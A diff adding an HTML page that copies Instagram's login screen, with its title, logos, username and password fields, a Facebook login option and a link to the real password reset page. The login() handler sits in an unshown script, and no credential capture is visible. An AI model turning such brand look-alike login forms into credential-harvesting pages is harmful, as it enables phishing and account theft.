@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="images/icons8-instagram-200.png" type="image/x-icon" />
+    <title>Instagram</title>
+    <!-- stylesheet -->
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <!-- instagram login page  -->
+    <section>
+      <div class="container">
+        <div class="main-wrap">
+          <div class="main-wrap-1">
+            <!-- logo written  -->
+            <div class="insta-logo">
+              <img src="images/insta-text.png" alt="" />
+            </div>
+            <!-- inputs -->
+            <div class="user-data-wrap">
+              <div class="user-data">
+                <input type="text" name="user" id="username" placeholder="" oninput="ChangeInput(this,'usern')" />
+                <label id="usern">Phone Number,Username or email</label>
+              </div>
+              <div class="user-data">
+                <input type="password" id="pass" placeholder="" oninput="ChangeInput(this,'userp')" onclick="password()" />
+                <label id="userp">password</label>
+                <span onclick="showpass()" id="show">show </span>
+              </div>
+              <button class="login" onclick="login()">Log in</button>
+            </div>
+            <!-- span for OR -->
+            <div class="or">
+              <div class="line"></div>
+              <span>OR</span>
+              <div class="line"></div>
+            </div>
+
+            <!-- Login with facebook & forgot password-->
+            <div class="fpass-login">
+              <div class="facebook-logo">
+                <img src="images/facebook_logo.png" alt="" />
+              </div>
+              <p>Log In With FaceBook</p>
+            </div>
+            <span class="fpass" onclick="window.open('https://www.instagram.com/accounts/password/reset/')">Forgot Password?</span>
+          </div>
+          <!-- Don't Have an account  -->
+          <div class="sign-up">
+            <p>Don't have An Account? <span onclick="signUp()">sign Up</span></p>
+          </div>
+          <!-- Get the app -->
+          <div class="app">
+            <p>Get the app</p>
+            <div class="app-btns">
+              <button class="gplay" onclick="gplay()"><img src="../images/gplay.png" alt="" /></button>
+              <button class="microsoft"><img src="images/microsoft.png" alt="" /></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- Scripts added here -->
+    <script src="main.js"></script>
+  </body>
+</html>
